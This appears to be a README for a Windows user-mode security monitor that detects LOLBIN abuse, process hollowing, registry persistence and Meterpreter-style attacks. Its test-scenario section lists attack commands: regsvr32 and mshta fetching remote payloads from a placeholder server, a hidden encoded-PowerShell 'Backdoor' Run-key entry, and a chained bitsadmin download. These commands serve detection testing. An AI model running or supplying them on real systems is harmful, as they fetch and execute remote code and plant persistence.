# usermodeapplicationlol

## Overview

**usermodeapplicationlol.exe** is a user-mode Windows security monitor designed to detect, block, and log advanced attack techniques, including Meterpreter, Volt Typhoon, and LOLBIN-based attacks. It leverages ETW (Event Tracing for Windows) for real-time monitoring, and enforces user/admin intervention via OTPs for suspicious actions.

---

## Key Security Features

- **ETW-based Monitoring:**
  - Process creation, memory operations, DLL loads, and registry changes
- **LOLBIN & Suspicious Command Detection:**
  - Detects and blocks dangerous use of built-in Windows binaries
- **PowerShell Deobfuscation:**
  - Decodes and analyzes obfuscated/encoded PowerShell commands
- **Process Hollowing Detection:**
  - Compares in-memory and on-disk hashes to detect hollowed processes
- **Registry Persistence Rollback:**
  - Detects and deletes unauthorized persistence attempts in the registry
- **OTP Enforcement:**
  - Requires user/admin OTPs for suspicious or malicious actions
- **Thread-safe Logging:**
  - Logs all events, malicious events, and invalid OTP attempts
- **Python ML/Heuristic Analysis:**
  - Uses `analyze.py` for advanced command-line analysis

---

## Defense Matrix

| Attack Technique         | Detection & Response                                      |
|-------------------------|----------------------------------------------------------|
| Process Injection       | Memory operation monitoring, suspend/terminate           |
| Reflective DLL Loading  | DLL load monitoring, terminate                           |
| PowerShell Obfuscation  | Deobfuscation engine, log/block                          |
| Registry Persistence    | Registry change monitoring + rollback                    |
| Process Hollowing       | Memory/disk image hash comparison, terminate             |
| Fileless Execution      | Memory scanning + PowerShell deobfuscation, block/OTP    |
| LOLBIN Usage            | Pattern matching, suspend/OTP/terminate                  |

---

## Build Instructions

1. **Requirements:**
   - Visual Studio (Windows, C++17 or later)
   - Python 3.x (for analyze.py and dependencies)
   - All source files in this repo
2. **Build:**
   - Open the solution in Visual Studio
   - Build the `usermodeapplicationlol` project in Release|x64
   - Build `otpverify.exe` (standalone OTP checker)

---

## Usage

1. **Run `usermodeapplicationlol.exe` as Administrator**
2. **Ensure `otpverify.exe` is in the same directory or PATH**
3. **Logs:**
   - `log_all.txt` — all events
   - `log_otp_correct_malicious.txt` — malicious events with correct OTP
   - `log_otp_incorrect.txt` — invalid OTP attempts

---

## Example Test Scenarios

### LOLBINs
- **PowerShell Encoded Command:**
  ```powershell
  powershell.exe -EncodedCommand SQBFAFgAIAAnAEgAZQBsAGxvACcA
  ```
- **regsvr32 Remote Script:**
  ```cmd
  regsvr32.exe /s /n /u /i:http://<server-ip>/shell.sct scrobj.dll
  ```
- **mshta Fileless Payload:**
  ```cmd
  mshta.exe http://<server-ip>/payload.hta
  ```

### Volt Typhoon
- **Registry Persistence:**
  ```powershell
  Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Backdoor' -Value 'powershell.exe -nop -w hidden -EncodedCommand ...'
  ```
- **Chained LOLBINs:**
  ```cmd
  cmd.exe /c "bitsadmin /transfer ... && mshta.exe http://<server-ip>/payload.hta"
  ```

### Meterpreter
- **Reflective DLL Injection:**
  - Use Metasploit to inject `metsrv.dll` or `ReflectiveLoader` into a process.
- **Process Hollowing:**
  - Use Metasploit’s process hollowing technique.
- **Fileless Meterpreter via PowerShell:**
  ```powershell
  powershell.exe -nop -w hidden -EncodedCommand <meterpreter stager>
  ```

---

## Notes
- **For testing only in isolated/lab environments.**
- **OTP codes and admin codes are demo values; replace with your own for production.**
- **For advanced detection, ensure Python and all dependencies are installed.**

---

## License
This project is for educational and research use only. 